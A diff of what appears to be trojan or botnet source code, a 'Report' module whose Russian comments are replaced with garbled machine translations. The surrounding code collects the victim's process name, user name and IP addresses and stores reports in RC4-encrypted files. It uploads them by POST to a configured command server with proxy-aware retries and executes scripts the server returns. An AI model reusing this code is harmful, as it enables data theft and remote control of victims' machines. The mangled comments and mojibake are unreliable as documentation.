@@ -29,29 +29,29 @@
 static WCHAR reportFile[MAX_PATH];
 static WCHAR reportFolder[MAX_PATH];
 
-//Типы потоков в CreateReportSender.
+//Types of flows in CreateReportSender.
 enum
 {
   DEFAULTSENDER_REPORT,
   DEFAULTSENDER_STATUS
 };
 
-//Общая струкура для работы с сервером.
+//Total strukura to work with the server.
 typedef struct
 {
-  BYTE threadType;                   //Одно из значений TT_*.
-  BinStorage::STORAGEARRAY storage;  //Массив. 
-  Crypt::RC4KEY rc4StorageKey;       //Ключ для конфигураций в хранилище.
-  WCHAR reportFile[MAX_PATH];        //Текущий файл для обработки.
-  ThreadsGroup::GROUP *group;        //Группа потоков (для создания дочерных потоков).
+  BYTE threadType;                   //One of the values вЂ‹вЂ‹TT_ *.
+  BinStorage::STORAGEARRAY storage;  //Array.
+  Crypt::RC4KEY rc4StorageKey;       //The key for the configuration in the repository.
+  WCHAR reportFile[MAX_PATH];        //Current file for processing.
+  ThreadsGroup::GROUP *group;        //Group of flows (to create a child thread).
 }SENDERDATA;
 
-//Внутриннии данные для XSender.
+//Vnutrinnii data XSender.
 enum 
 {
-  DSR_SENDED,    //Отчет отправлен.
-  DSR_WAIT_DATA, //Ожидание данных.
-  DSR_ERROR      //Ошибка при отравки.
+  DSR_SENDED,    //The report has been submitted.
+  DSR_WAIT_DATA, //Waiting for data.
+  DSR_ERROR      //Error while otravki.
 };
 
 /*
@@ -62,26 +62,26 @@ enum
 */
 static void initReportFile(bool forWrite, LPWSTR tempFile)
 {
-  //Инициализация.
+  //Initialization.
   if(reportFile[0] == 0)
   {
     Core::getPeSettingsPath(Core::PSP_REPORTFILE, reportFile);
     
-    //Директория
+    //Directory
     Str::_CopyW(reportFolder, reportFile, -1);
     CWA(shlwapi, PathRemoveFileSpecW)(reportFolder);
     
     WDEBUG1(WDDT_INFO, "reportFile=[%s].", reportFile);
   }
 
-  //Временный файл.
+  //Temporary file.
   if(tempFile != NULL)
   {
     Str::_CopyW(tempFile, reportFile, -1);
     CWA(shlwapi, PathRenameExtensionW)(tempFile, FILEEXTENSION_TEMP);
   }
  
-  //Проверка прав.
+  //Verification of rights.
   if(forWrite && coreData.integrityLevel > Process::INTEGRITY_LOW)
   {
     Fs::_createDirectoryTree(reportFolder, /*&coreData.securityAttributes.saAllowAll*/NULL);
@@ -220,21 +220,21 @@ bool Report::addBasicInfo(BinStorage::STORAGE **binStorage, DWORD flags)
 
     if((size = CWA(kernel32, GetModuleFileNameW)(NULL, file, MAX_PATH - 1)) > 0)
     {
-      file[size] = 0; //На всякий случай.
+      file[size] = 0; //Just in case.
       r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_PROCESS_NAME, BinStorage::ITEMF_COMBINE_OVERWRITE, file);
     }
 
     size = sizeof(file) / sizeof(WCHAR);
     if(r && CWA(secur32, GetUserNameExW)(NameSamCompatible, file, &size) != FALSE && size > 0)
     {
-      file[size] = 0; //На всякий случай.
+      file[size] = 0; //Just in case.
       r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_PROCESS_USER, BinStorage::ITEMF_COMBINE_OVERWRITE, file);
     }
   }
 
   if(r && flags & BIF_IP_ADDRESSES)
   {
-    //Не проверяем код возврата, т.к. интерфейсов может не существовать.
+    //Do not check the return code, because interfaces may not exist.
     addIpAddressesToReport(binStorage, AF_INET);
     addIpAddressesToReport(binStorage, AF_INET6);
   }
@@ -265,15 +265,15 @@ static int defaultSenderRequestProc(DWORD loop, Report::SERVERSESSION *session)
       return Report::SSPR_CONTUNUE;
     }    
   }
-  else //if(senderData->threadType == DEFAULTSENDER_REPORT)
+  else //if (senderData-> threadType == DEFAULTSENDER_REPORT)
   {
-    //Если первый запрос.
+    //If the first request.
     if(loop == 0)
     {
-      //Страховка.
+      //Insurance.
       BinStorage::_closeStorageArray(&senderData->storage);
       
-      //Получаем ключи шифрования.
+      //Obtain the encryption keys.
       {
         PESETTINGS pes;
         Core::getPeSettings(&pes);
@@ -281,16 +281,16 @@ static int defaultSenderRequestProc(DWORD loop, Report::SERVERSESSION *session)
         Mem::_copy(&senderData->rc4StorageKey, &pes.rc4Key, sizeof(Crypt::RC4KEY));
       }
 
-      //Открываем.
+      //Open.
       if(!BinStorage::_openStorageArray(senderData->reportFile, BinStorage::OSF_WRITE_ACCESS, &senderData->storage))
       {
-        //Такой смелый поступок вызван тем, что в основном потоке, создается сессия только при
-        //наличии файла отчета, а если его не удалось открыть, просто удаляем и выходим.
+        //Such a bold move by the fact that the main stream, creates a session only if
+        //the presence of the log file, and if it failed to open, simply remove and leave.
         goto REMOVE_REPORT_FILE;
       }
     }
 
-    //Получние следующего элемента.
+    //Residency next item.
     BinStorage::STORAGE *binStorage;
     DWORD size;
     if(BinStorage::_getNextFromStorageArray(&senderData->storage, &binStorage, &size, &senderData->rc4StorageKey) && size > 0)
@@ -310,7 +310,7 @@ static int defaultSenderRequestProc(DWORD loop, Report::SERVERSESSION *session)
       WDEBUG0(WDDT_ERROR, "Not enough memory.");
     }
 
-    //Удаление файла.
+    //Deleting a file.
 REMOVE_REPORT_FILE:
     /*
       В случаи ошибки открытия файла, получения следующий конфгурации, или достижения конца файла,
@@ -333,15 +333,15 @@ static int defaultSenderResultProc(DWORD loop, Report::SERVERSESSION *session)
 {
   SENDERDATA *senderData = (SENDERDATA *)session->customData;
   
-  //Исполнения скриптов.
+  //Execution of scripts.
   if(session->postData->count > 0 && session->postData->size > sizeof(BinStorage::STORAGE) + sizeof(BinStorage::ITEM))
   {
     BinStorage::STORAGE *script = (BinStorage::STORAGE *)Mem::copyEx(session->postData, session->postData->size);
     if(script != NULL && !RemoteScript::_exec(script))Mem::free(script);
   }
 
-  //Метка отчета, как отпралдвенного.
-  if(senderData->threadType == DEFAULTSENDER_REPORT)
+  //Tag Report as otpraldvennogo.
+  if (senderData-> threadType == DEFAULTSENDER_REPORT)
   {
     if(BinStorage::_removeCurrentFromStorageArray(&senderData->storage))return Report::SSPR_CONTUNUE;
     WDEBUG0(WDDT_INFO, "Unknown error in storage file founded, stopping session.");
@@ -352,26 +352,24 @@ static int defaultSenderResultProc(DWORD loop, Report::SERVERSESSION *session)
   return Report::SSPR_END;
 }
 
-/*
-  Поиск файл для загрузки на сервер.
+/*В В Search for a file to upload.
 
-  OUT fileName - полный путь файла.
-  IN tempFile  - полный путь временного файла.
-  IN maxDelay  - макс время задержки для отчета max(errorDelay, normalDelay).
+В В OUT fileName - the full path of the file.
+В В IN tempFile - the full path of the temporary file.
+В В IN maxDelay - max delay time for the report max (errorDelay, normalDelay).
 
-  Return       - true - файл найден,
-                 false - файл не найден.
-*/
+В В Return - true - the file is found,
+В В В В В В В В В В В В В В В В В false - file not found.*/
 static bool findReportFileForSending(LPWSTR fileName, LPWSTR tempFile, DWORD maxDelay)
 {
-  //Проверяем не отосланный временный файл.
+  //Check is not sent out a temporary file.
   if(CWA(kernel32, GetFileAttributesW)(tempFile) != INVALID_FILE_ATTRIBUTES)
   {
     Str::_CopyW(fileName, tempFile, -1);
     return true;
   }
   
-  //Проверяем файл отчета.
+  //Check the log file.
   if(CWA(kernel32, GetFileAttributesW)(reportFile) != INVALID_FILE_ATTRIBUTES)
   {
     Str::_CopyW(fileName, reportFile, -1);
@@ -393,7 +391,7 @@ static DWORD WINAPI defaultSender(void *p)
     return 1;
   }
 
-  //Насатраиваем данные сессии.
+  //Nasatraivaem session data.
   Report::SERVERSESSION serverSession;
   Crypt::RC4KEY rc4Key;
   
@@ -403,7 +401,7 @@ static DWORD WINAPI defaultSender(void *p)
   serverSession.rc4Key      = &rc4Key;
   serverSession.customData  = senderData;
 
-  //Получем таймауты.
+  //Got timeout.
   DWORD normalDelay;
   DWORD errorDelay;
   DWORD maxDelay;
@@ -432,7 +430,7 @@ static DWORD WINAPI defaultSender(void *p)
     Mem::_zero(&baseConfig, sizeof(BASECONFIG));
   }
   
-  //Запуск.
+  //Start.
   BYTE loopResult;
   WCHAR tempFile[MAX_PATH];
 
@@ -443,13 +441,13 @@ static DWORD WINAPI defaultSender(void *p)
   {
     loopResult = DSR_WAIT_DATA;
 
-    //Проверяем наличие отчетов.
-    if(senderData->threadType == DEFAULTSENDER_REPORT)
+    //Check the availability of reports.
+    if (senderData-> threadType == DEFAULTSENDER_REPORT)
     {
       initReportFile(false, tempFile[0] == 0 ? tempFile : NULL);
       if(!findReportFileForSending(senderData->reportFile, tempFile, maxDelay))continue;
       
-      //Проверяем файл.
+      //Check file.
       {
         DWORD64 fileSize = Fs::_getFileSizeEx(senderData->reportFile);
         if(fileSize == (DWORD)(-1) || fileSize > 0xFFFFFFFF)
@@ -462,7 +460,7 @@ static DWORD WINAPI defaultSender(void *p)
       
       WDEBUG1(WDDT_INFO, "Founded \"%s\".", senderData->reportFile);
 
-      //Перемещаем во временный файл.
+      //Move the temporary file.
       if(CWA(kernel32, lstrcmpiW)(senderData->reportFile, tempFile) != 0)
       {
         HANDLE reportMutex = Core::waitForMutexOfObject(Core::OBJECT_ID_REPORTFILE, MalwareTools::KON_GLOBAL);
@@ -483,7 +481,7 @@ static DWORD WINAPI defaultSender(void *p)
       }
     }
     
-    //Создаем сессию.
+    //Create the session.
     BinStorage::STORAGE *binStorage = DynamicConfig::getCurrent();
     if(binStorage != NULL)
     {
@@ -551,18 +549,18 @@ static int __inline sendRequest(HttpTools::URLDATA *ud, HINTERNET serverHandle, 
     if(procRetCode != Report::SSPR_CONTUNUE)result = procRetCode;
     else if(session->postData != NULL && (size = BinStorage::_pack(&session->postData, BinStorage::PACKF_FINAL_MODE, (Crypt::RC4KEY *)session->rc4Key)) > 0)
     {
-      //Отправляем запрос.
+      //Send request.
       DWORD requestFlags = Wininet::WISRF_METHOD_POST | Wininet::WISRF_KEEP_CONNECTION;
       if(ud->scheme == HttpTools::UDS_HTTPS)requestFlags |= Wininet::WISRF_IS_HTTPS;
 
       HINTERNET requestHandle = Wininet::_SendRequest(serverHandle, ud->uri, NULL, session->postData, size, requestFlags);
       if(requestHandle != NULL)
       {
-        //Получаем ответ.
+        //Get an answer.
         MEMDATA md;
         if(Wininet::_DownloadData(requestHandle, &md, 0, session->stopEvent))
         {
-          //Распаковывем ответ.
+          //Unpacking the answer.
           size = BinStorage::_unpack(NULL, md.data, md.size, (Crypt::RC4KEY *)session->rc4Key);
 
           Mem::free(session->postData);
@@ -585,16 +583,16 @@ bool Report::startServerSession(SERVERSESSION *session)
 
   bool retVal = false;
   HttpTools::URLDATA ud;
-  BinStorage::STORAGE *originalPostData = session->postData; //Сохраняем оригинальные пост-данные.
+  BinStorage::STORAGE *originalPostData = session->postData; //Save the original post-data.
 
   if(HttpTools::_parseUrl(session->url, &ud))
   {
     Core::initHttpUserAgent();
 
-    //Цикл повтора подключений к серверу в случаи обрыва или недоступности.
+    //Repeat cycle connections to the server in case of disconnection or unavailable.
     for(BYTE bi = 0; bi < WININET_CONNECT_RETRY_COUNT && retVal == false; bi++)
     {
-      //Задержка.
+      //Delay.
       if(bi > 0)
       {
         if(session->stopEvent != NULL)
@@ -604,7 +602,7 @@ bool Report::startServerSession(SERVERSESSION *session)
         else CWA(kernel32, Sleep)(WININET_CONNECT_RETRY_DELAY);
       }
 
-      //Создаем хэндл сервера.
+      //Create a handle to the server.
       HINTERNET serverHandle = Wininet::_Connect(coreData.httpUserAgent, ud.host, ud.port, bi % 2 == 0 ? Wininet::WICF_USE_IE_PROXY : 0);
       if(serverHandle != NULL)
       {
@@ -620,7 +618,7 @@ bool Report::startServerSession(SERVERSESSION *session)
     HttpTools::_freeUrlData(&ud);
   }
 
-  session->postData = originalPostData; //Восстанавливаем оригинальные пост-данные.
+  session->postData = originalPostData; //Restoring the original post-data.
   return retVal;
 }
 
